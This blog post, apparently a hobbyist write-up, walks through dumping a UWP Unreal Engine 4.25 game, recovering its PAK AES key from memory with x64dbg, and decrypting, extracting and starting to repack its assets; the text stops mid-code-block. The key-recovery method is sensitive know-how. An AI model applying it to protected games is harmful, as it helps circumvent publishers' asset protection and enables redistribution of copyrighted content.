<p>After some research, I found out that <a href="https://github.com/Wunkolo/UWPDumper.git">UWPDumper</a> does the job perfectly. Looking at the source code, it looks like the application injects itself into the UWP process, sets its access control as <code class="language-plaintext highlighter-rouge">S-1-15-2-1</code> (ALL_APP_PACKAGES) and creates a remote thread that handles the file read write. Well, at least in the future I’d know what to do now. Anyways, I used the existing binary from the repo and got the files I was looking for.</p>

<p><a href="/assets/images/posts/unreal-pak/690e643c0e37ab84fec6dddb23bb945511f671fda21ecc18846019fc45295368.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/690e643c0e37ab84fec6dddb23bb945511f671fda21ecc18846019fc45295368-600-b59e0f71f.png" srcset="/generated/assets/images/posts/unreal-pak/690e643c0e37ab84fec6dddb23bb945511f671fda21ecc18846019fc45295368-600-b59e0f71f.png 1.0x, /generated/assets/images/posts/unreal-pak/690e643c0e37ab84fec6dddb23bb945511f671fda21ecc18846019fc45295368-900.0-b59e0f71f.png 1.5x, /generated/assets/images/posts/unreal-pak/690e643c0e37ab84fec6dddb23bb945511f671fda21ecc18846019fc45295368-1142-b59e0f71f.png 1.9x"></a></p>

<h2 id="dumping-the-internal-files">Dumping the Internal Files</h2>

<p>Since the majority of the dump came from this <code class="language-plaintext highlighter-rouge">XXXXXX-WinGDK.pak</code> file, I’d have to assume most of the assets came from this file. The handle view in Process Hacker confirms this, where no other visible files are loaded except for this file, the executable itself, and its dependencies.</p>

<p><a href="/assets/images/posts/unreal-pak/d90f12ff934b416e3b06ecec6484b7af2a2a942e10e429c52b3590bff5bcfb3b.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/d90f12ff934b416e3b06ecec6484b7af2a2a942e10e429c52b3590bff5bcfb3b-600-e328e2e74.png" srcset="/generated/assets/images/posts/unreal-pak/d90f12ff934b416e3b06ecec6484b7af2a2a942e10e429c52b3590bff5bcfb3b-600-e328e2e74.png 1.0x, /generated/assets/images/posts/unreal-pak/d90f12ff934b416e3b06ecec6484b7af2a2a942e10e429c52b3590bff5bcfb3b-900.0-e328e2e74.png 1.5x, /generated/assets/images/posts/unreal-pak/d90f12ff934b416e3b06ecec6484b7af2a2a942e10e429c52b3590bff5bcfb3b-1200-e328e2e74.png 2.0x"></a></p>

<p>After some <a href="https://gbatemp.net/threads/how-to-unpack-and-repack-unreal-engine-4-files.531784/">additional</a> <a href="https://github.com/allcoolthingsatoneplace/UnrealPakTool">reading</a>, I had concluded that this is gonna be more than just a one-click-and-it’s-done type of job.</p>

<p>In order to dump the PAK, I had to first determine the version of the Unreal Engine used to build the game. Why? Because apparently Unreal is <em>really</em> sensitive to version changes. Any new version increment (excluding patch increment, fortunately) will cause issues. Heck, even different version of <code class="language-plaintext highlighter-rouge">uassets</code> can cause the engine to not load the asset.</p>

<p>Thankfully, by checking the properties of the game binary, the engine had compiled its version name in there, which is <code class="language-plaintext highlighter-rouge">4.25.0</code>.</p>

<p><a href="/assets/images/posts/unreal-pak/ab1411e953c2902b415b3a720ff33c7e7da970c386fe2b1e2ed0414234b9d15c.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/ab1411e953c2902b415b3a720ff33c7e7da970c386fe2b1e2ed0414234b9d15c-539-80a4b045a.png" srcset="/generated/assets/images/posts/unreal-pak/ab1411e953c2902b415b3a720ff33c7e7da970c386fe2b1e2ed0414234b9d15c-539-80a4b045a.png 0.9x"></a></p>

<p>Next up, let’s try dumping the game using UnrealPak, an official utility that handles PAK-related operation. A copy of the <a href="https://github.com/allcoolthingsatoneplace/UnrealPakTool">4.25.x UnrealPak can be found on GitHub.</a> Let’s give it a go!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./unrealpak.exe
LogPaths: Warning: No paths for game localization data were specifed in the game configuration.
LogPakFile: Display: Using command line for crypto configuration
LogPakFile: Error: No pak file name specified. Usage:
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -Test
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -List [-ExcludeDeleted]
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; &lt;GameUProjectName&gt; &lt;GameFolderName&gt; -ExportDependencies=&lt;OutputFileBase&gt; -NoAssetRegistryCache -ForceDependsGathering
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -Extract &lt;ExtractDir&gt; [-Filter=&lt;filename&gt;]
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -Create=&lt;ResponseFile&gt; [Options]
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -Dest=&lt;MountPoint&gt;
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -Repack [-Output=Path] [-ExcludeDeleted] [Options]
LogPakFile: Error:   UnrealPak &lt;PakFilename1&gt; &lt;PakFilename2&gt; -diff
LogPakFile: Error:   UnrealPak &lt;PakFolder&gt; -AuditFiles [-OnlyDeleted] [-CSV=&lt;filename&gt;] [-order=&lt;OrderingFile&gt;] [-SortByOrdering]
LogPakFile: Error:   UnrealPak &lt;PakFilename&gt; -WhatsAtOffset [offset1] [offset2] [offset3] [...]
LogPakFile: Error:   UnrealPak &lt;PakFolder&gt; -GeneratePIXMappingFile -OutputPath=&lt;Path&gt;
LogPakFile: Error:   Options:
LogPakFile: Error:     -blocksize=&lt;BlockSize&gt;
LogPakFile: Error:     -bitwindow=&lt;BitWindow&gt;
LogPakFile: Error:     -compress
LogPakFile: Error:     -encrypt
LogPakFile: Error:     -order=&lt;OrderingFile&gt;
LogPakFile: Error:     -diff (requires 2 filenames first)
LogPakFile: Error:     -enginedir (specify engine dir for when using ini encryption configs)
LogPakFile: Error:     -projectdir (specify project dir for when using ini encryption configs)
LogPakFile: Error:     -encryptionini (specify ini base name to gather encryption settings from)
LogPakFile: Error:     -extracttomountpoint (Extract to mount point path of pak file)
LogPakFile: Error:     -encryptindex (encrypt the pak file index, making it unusable in unrealpak without supplying the key)
LogPakFile: Error:     -compressionformat[s]=&lt;Format[,format2,...]&gt; (set the format(s) to compress with, falling back on failures)
LogPakFile: Error:     -encryptionkeyoverrideguid (override the encryption key guid used for encrypting data in this pak file)
LogPakFile: Error:     -sign (generate a signature (.sig) file alongside the pak)
LogPakFile: Error:     -fallbackOrderForNonUassetFiles (if order is not specified for ubulk/uexp files, figure out implicit order based on the uasset order. Generally applies only to the cooker order)
LogPakFile: Display: Unreal pak executed in 0.017149 seconds
</code></pre></div></div>

<p>Alright, let’s try <code class="language-plaintext highlighter-rouge">-Test</code> to get a quick start.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ .\UnrealPak.exe -test .\[REDACTED]-WinGDK.pak
LogPaths: Warning: No paths for game localization data were specified in the game configuration.
LogPakFile: Display: Using command line for crypto configuration
LogWindows: Error: === Critical error: ===
LogWindows: Error:
LogWindows: Error: Fatal error: [File:C:/Users/spark/Desktop/UnrealEngine/Engine/Source/Runtime/PakFile/Private/IPlatformFilePak.cpp] [Line: 273]
LogWindows: Error: Failed to find requested encryption key 00000000000000000000000000000000
LogWindows: Error: [Callstack] 0x00007ffc63238ef6 UnrealPak-PakFile.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffc63231d52 UnrealPak-PakFile.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffc6323dbe8 UnrealPak-PakFile.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffc6323b44f UnrealPak-PakFile.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffc632286d7 UnrealPak-PakFile.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffc630db1a6 UnrealPak-PakFileUtilities.dll!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ff6df52a507 UnrealPak.exe!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ff6df52b278 UnrealPak.exe!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffca85c7034 KERNEL32.DLL!UnknownFunction []
LogWindows: Error: [Callstack] 0x00007ffca9f7d0d1 ntdll.dll!UnknownFunction []
LogWindows: Error:
LogWindows: Error:
LogWindows: Error:
LogWindows: Error:
</code></pre></div></div>

<p>Well darn. It looks like the files are encrypted. <a href="https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/">After doing some reading</a>, it appears Unreal’s PAK format are typically encrypted using AES with a SHA-1 key.</p>

<h2 id="decrypting-the-pak">Decrypting the PAK</h2>

<p>Ah yes, debugging time! Thankfully, Unreal Engine is now open-source, meaning I should be able to follow the source code to follow the code and find the decryption routine.</p>

<p><a href="/assets/images/posts/unreal-pak/fc36c40c3c2bf3bd897951a40c4a68021e01b8bdb4a54c5e2d82d420deb853e2.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/fc36c40c3c2bf3bd897951a40c4a68021e01b8bdb4a54c5e2d82d420deb853e2-600-478df7f98.png" srcset="/generated/assets/images/posts/unreal-pak/fc36c40c3c2bf3bd897951a40c4a68021e01b8bdb4a54c5e2d82d420deb853e2-600-478df7f98.png 1.0x, /generated/assets/images/posts/unreal-pak/fc36c40c3c2bf3bd897951a40c4a68021e01b8bdb4a54c5e2d82d420deb853e2-900.0-478df7f98.png 1.5x, /generated/assets/images/posts/unreal-pak/fc36c40c3c2bf3bd897951a40c4a68021e01b8bdb4a54c5e2d82d420deb853e2-1200-478df7f98.png 2.0x"></a></p>

<p>Let’s first find the decryption routine in the 4.25 Unreal source code. We can do that by simply looking up the word <code class="language-plaintext highlighter-rouge">decrypt</code> in the repo.</p>

<figure class="half">
<a href="/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584.png">
  <picture>
    <source srcset="/generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-400-96d374f7e.webp 400w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-600-96d374f7e.webp 600w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-800-96d374f7e.webp 800w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-1000-96d374f7e.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-400-ed96246a0.png 400w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-600-ed96246a0.png 600w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-800-ed96246a0.png 800w, /generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-1000-ed96246a0.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/unreal-pak/4c349e2126dda6a0297f0e6f11c2b72b6fb8c44f68bbdf17f558bc234d851584-800-ed96246a0.png" width="1998" height="795" />
  </picture>
</a>

<a href="/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f.png">
  <picture>
    <source srcset="/generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-400-f841b3b8e.webp 400w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-600-f841b3b8e.webp 600w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-800-f841b3b8e.webp 800w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-1000-f841b3b8e.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-400-aed2c1724.png 400w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-600-aed2c1724.png 600w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-800-aed2c1724.png 800w, /generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-1000-aed2c1724.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/unreal-pak/20a93629fb3afc6366a4b788cd5482b5e331ff68d853293a8e241e6c84ae782f-800-aed2c1724.png" width="1686" height="501" />
  </picture>
</a>
  
</figure>

<p>That was easy enough. We can also see that the function is also referenced on L5043 - and there are strings surrounding it. Perfect, that should help us pinpoint where exactly the function is in memory. <code class="language-plaintext highlighter-rouge">GetPakEncryptionKey</code> sounds interesting. We should take a look there later. Let’s fire up x64dbg. Since we already know what the surrounding strings are, we can just do a string search for literally any of them - in this case <code class="language-plaintext highlighter-rouge">Failed to find requested encryption key</code> - to quickly pinpoint the address of the function.</p>

<p><a href="/assets/images/posts/unreal-pak/a806ab35da0a3332326e46fee23f4438f8f3bcb78466d7b3f4b596588871d6de.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/a806ab35da0a3332326e46fee23f4438f8f3bcb78466d7b3f4b596588871d6de-600-ec49c95ab.png" srcset="/generated/assets/images/posts/unreal-pak/a806ab35da0a3332326e46fee23f4438f8f3bcb78466d7b3f4b596588871d6de-600-ec49c95ab.png 1.0x, /generated/assets/images/posts/unreal-pak/a806ab35da0a3332326e46fee23f4438f8f3bcb78466d7b3f4b596588871d6de-900.0-ec49c95ab.png 1.5x, /generated/assets/images/posts/unreal-pak/a806ab35da0a3332326e46fee23f4438f8f3bcb78466d7b3f4b596588871d6de-1200-ec49c95ab.png 2.0x"></a></p>

<p>After we’ve found the address, we can set a breakpoint on its parent routine and watch it run.</p>

<figure class="half">
<a href="/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0.png">
  <picture>
    <source srcset="/generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-400-4c9f87b35.webp 400w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-600-4c9f87b35.webp 600w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-800-4c9f87b35.webp 800w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-1000-4c9f87b35.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-400-0df79d4ba.png 400w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-600-0df79d4ba.png 600w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-800-0df79d4ba.png 800w, /generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-1000-0df79d4ba.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/unreal-pak/c601b4f213170252d4a2c27ebe823ac6d4646247614968a94a3082a794b8a8f0-800-0df79d4ba.png" width="1540" height="728" />
  </picture>
</a>
  
<a href="/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0.png">
  <picture>
    <source srcset="/generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-400-8a83862aa.webp 400w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-600-8a83862aa.webp 600w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-800-8a83862aa.webp 800w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-1000-8a83862aa.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-400-74a88cb4e.png 400w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-600-74a88cb4e.png 600w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-800-74a88cb4e.png 800w, /generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-1000-74a88cb4e.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/unreal-pak/07f7f2380b31dddc8672b97f1081ac7ea526139195ece9aeeac926cad964c7c0-800-74a88cb4e.png" width="2505" height="1573" />
  </picture>
</a>
  
</figure>

<p>“Huh, that’s strange. I thought the function was quite small, and if this were <code class="language-plaintext highlighter-rouge">GetPakEncryptionKey</code>, what happened to the <code class="language-plaintext highlighter-rouge">DecryptData</code> method?” you may think. What more than likely happened here was compiler optimization. Instead of having to call more than one subroutine, the compiler will often try to find and merge routines together at compile-time to optimize the number of instructions required to carry out the task.</p>

<p>At this point, it’s just the matter of trial and error and seeing what each subroutine returns in their corresponding registers. When a subroutine returns, x64dbg will highlight the register(s) that has changed since the execution in red.</p>

<p><a href="/assets/images/posts/unreal-pak/e2587f3173f6d03314faf0fdf19f7d937bc4fcaf0c116dc77787e45935d8e9d8.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/e2587f3173f6d03314faf0fdf19f7d937bc4fcaf0c116dc77787e45935d8e9d8-600-1027461b2.png" srcset="/generated/assets/images/posts/unreal-pak/e2587f3173f6d03314faf0fdf19f7d937bc4fcaf0c116dc77787e45935d8e9d8-600-1027461b2.png 1.0x, /generated/assets/images/posts/unreal-pak/e2587f3173f6d03314faf0fdf19f7d937bc4fcaf0c116dc77787e45935d8e9d8-806-1027461b2.png 1.34x"></a></p>

<p>By inspecting each register in dump, we can quickly find the AES key required to decrypt the data. In this case, the corresponding register for the decryption method containing the key was RCX. How did I know what was in the dump was in fact the key? We already knew based on previous documentations that the AES encryption key is a SHA-1 hash. There are 160 bits in a SHA-1 hash, which is the equivalent of 20 bytes. The output just so happens to contain a continuous 20-byte data.</p>

<p><a href="/assets/images/posts/unreal-pak/d738f9312e190b1cb41a474f6609f20b9769e94049a58d99080cff0ffc1dac7f.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/d738f9312e190b1cb41a474f6609f20b9769e94049a58d99080cff0ffc1dac7f-600-6ec35e81b.png" srcset="/generated/assets/images/posts/unreal-pak/d738f9312e190b1cb41a474f6609f20b9769e94049a58d99080cff0ffc1dac7f-600-6ec35e81b.png 1.0x, /generated/assets/images/posts/unreal-pak/d738f9312e190b1cb41a474f6609f20b9769e94049a58d99080cff0ffc1dac7f-900.0-6ec35e81b.png 1.5x, /generated/assets/images/posts/unreal-pak/d738f9312e190b1cb41a474f6609f20b9769e94049a58d99080cff0ffc1dac7f-1200-6ec35e81b.png 2.0x"></a></p>

<p>Now that we have the SHA-1 AES key, we can now feed it to UnrealPak! UnrealPak takes a Base64’d AES key in its configuration file (typically <code class="language-plaintext highlighter-rouge">crypto.json</code>). All we need to do now is jot down the key, convert it to Base64, and bam, we can now run the decryption process! For the decryption process, I found that I needed to actually install the Unreal Editor itself for it to work, so I guess we didn’t need to download that GitHub mirror after all.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">programfiles</span><span class="s2">\Epic Games\UE_4.25\Engine\Binaries\Win64\UnrealPak.exe"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\Desktop\DUMP\&lt;REDACTED&gt;\Content\Paks\&lt;REDACTED&gt;-WinGDK.pak"</span><span class="w"> </span><span class="nt">-Extract</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\Desktop\DUMP_PAK"</span><span class="w"> </span><span class="nt">-CryptoKeys</span><span class="o">=</span><span class="s2">"Crypto.json"</span><span class="w">
</span></code></pre></div></div>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
   </span><span class="nl">"$types"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"UnrealBuildTool.EncryptionAndSigning+CryptoSettings, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"UnrealBuildTool.EncryptionAndSigning+EncryptionKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"UnrealBuildTool.EncryptionAndSigning+SigningKeyPair, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"UnrealBuildTool.EncryptionAndSigning+SigningKey, UnrealBuildTool, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4"</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"$type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"EncryptionKey"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"$type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Guid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;REDACTED&gt;"</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"SigningKey"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bEnablePakSigning"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bEnablePakIndexEncryption"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bEnablePakIniEncryption"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bEnablePakUAssetEncryption"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bEnablePakFullAssetEncryption"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
   </span><span class="nl">"bDataCryptoRequired"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"PakEncryptionRequired"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"PakSigningRequired"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
   </span><span class="nl">"SecondaryEncryptionKeys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">

   </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><a href="/assets/images/posts/unreal-pak/0979c7637c516f1bdd6ae87250c466dd642fdcd03667aa75ab0136c8ae807420.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/0979c7637c516f1bdd6ae87250c466dd642fdcd03667aa75ab0136c8ae807420-600-d0c753af3.png" srcset="/generated/assets/images/posts/unreal-pak/0979c7637c516f1bdd6ae87250c466dd642fdcd03667aa75ab0136c8ae807420-600-d0c753af3.png 1.0x, /generated/assets/images/posts/unreal-pak/0979c7637c516f1bdd6ae87250c466dd642fdcd03667aa75ab0136c8ae807420-900.0-d0c753af3.png 1.5x, /generated/assets/images/posts/unreal-pak/0979c7637c516f1bdd6ae87250c466dd642fdcd03667aa75ab0136c8ae807420-1108-d0c753af3.png 1.85x"></a></p>

<p>Nice! Now I can explore the game’s content to my heart’s content with things like <code class="language-plaintext highlighter-rouge">john-wick-parse</code> for deserializing <code class="language-plaintext highlighter-rouge">*.uasset</code> files, and <code class="language-plaintext highlighter-rouge">umodel</code> for viewing models!</p>

<h2 id="dumping-the-audio">Dumping the Audio</h2>

<p>For dumping and extracting the game’s WWise audio bank, I had to use a tool called <a href="https://github.com/hpxro7/wwiseutil"><code class="language-plaintext highlighter-rouge">wwiseutil</code></a> to view and extract the game’s <code class="language-plaintext highlighter-rouge">*.bnk</code> files.</p>

<p><a href="/assets/images/posts/unreal-pak/26e2947cb1b4f248f4568fa101e6573b37dd4025f90d1d116abab7dbd9dbefdd.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/26e2947cb1b4f248f4568fa101e6573b37dd4025f90d1d116abab7dbd9dbefdd-600-c94c4eba9.png" srcset="/generated/assets/images/posts/unreal-pak/26e2947cb1b4f248f4568fa101e6573b37dd4025f90d1d116abab7dbd9dbefdd-600-c94c4eba9.png 1.0x, /generated/assets/images/posts/unreal-pak/26e2947cb1b4f248f4568fa101e6573b37dd4025f90d1d116abab7dbd9dbefdd-900.0-c94c4eba9.png 1.5x, /generated/assets/images/posts/unreal-pak/26e2947cb1b4f248f4568fa101e6573b37dd4025f90d1d116abab7dbd9dbefdd-902-c94c4eba9.png 1.5x"></a></p>

<p>Then finally, I can use a foobar2000 extension called <a href="https://www.foobar2000.org/components/view/foo_input_vgmstream">vgmstream</a> to listen to and transcode the audio from the WEM format to WAV.</p>

<p><a href="/assets/images/posts/unreal-pak/2e2ec2f135afbc4f395cfc393791eb6c16480530d49a2b26fdd6c5a7c100a6b9.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/2e2ec2f135afbc4f395cfc393791eb6c16480530d49a2b26fdd6c5a7c100a6b9-600-4f449f96e.png" srcset="/generated/assets/images/posts/unreal-pak/2e2ec2f135afbc4f395cfc393791eb6c16480530d49a2b26fdd6c5a7c100a6b9-600-4f449f96e.png 1.0x, /generated/assets/images/posts/unreal-pak/2e2ec2f135afbc4f395cfc393791eb6c16480530d49a2b26fdd6c5a7c100a6b9-900.0-4f449f96e.png 1.5x, /generated/assets/images/posts/unreal-pak/2e2ec2f135afbc4f395cfc393791eb6c16480530d49a2b26fdd6c5a7c100a6b9-1200-4f449f96e.png 2.0x"></a></p>

<h2 id="repackaging-the-game">Repackaging the Game</h2>

<p>This part actually had me stumped for a day or two, since there weren’t too many documentations out there that outline for Unreal Editor packs and cooks its PAK file. I had to find out the command-line parameters used by the Editor by viewing them in Process Hacker. Essentially, the Editor first compiles a list of files needed to be in the PAK to a text file in the format of <code class="language-plaintext highlighter-rouge">&lt;path_to_file&gt; &lt;internal_path&gt;</code>. For example,</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ...</span><span class="w">
</span><span class="s2">"C:/Users/Still/Desktop/DUMP_PAK/Engine/Content/Functions/Engine_MaterialFunctions02/HueShift.uasset"</span><span class="w"> </span><span class="s2">"../../../Engine/Content/Functions/Engine_MaterialFunctions02/HueShift.uasset"</span><span class="w">
</span><span class="s2">"C:/Users/Still/Desktop/DUMP_PAK/Engine/Content/Functions/Engine_MaterialFunctions02/Lerp_Multiple_Float3.uasset"</span><span class="w"> </span><span class="s2">"../../../Engine/Content/Functions/Engine_MaterialFunctions02/Lerp_Multiple_Float3.uasset"</span><span class="w">
</span><span class="s2">"C:/Users/Still/Desktop/DUMP_PAK/Engine/Content/Functions/Engine_MaterialFunctions02/SafeNormalize.uasset"</span><span class="w"> </span><span class="s2">"../../../Engine/Content/Functions/Engine_MaterialFunctions02/SafeNormalize.uasset"</span><span class="w">
</span><span class="c"># ...</span><span class="w">
</span></code></pre></div></div>

<p>Thankfully, I didn’t really need to reconstruct one myself. During the previous extraction step, UnrealPak will already print out what files were extracted. Simply capture the output of the tool and replace irrelevant strings that do not conform to the above format and shift the strings around, and you’ll be set! After then, run the UnrealPak tool with a <code class="language-plaintext highlighter-rouge">Create</code>, <code class="language-plaintext highlighter-rouge">Encrypt</code> and <code class="language-plaintext highlighter-rouge">CryptoKeys</code> parameter (formatted below).</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># capture the output to a file</span><span class="w">
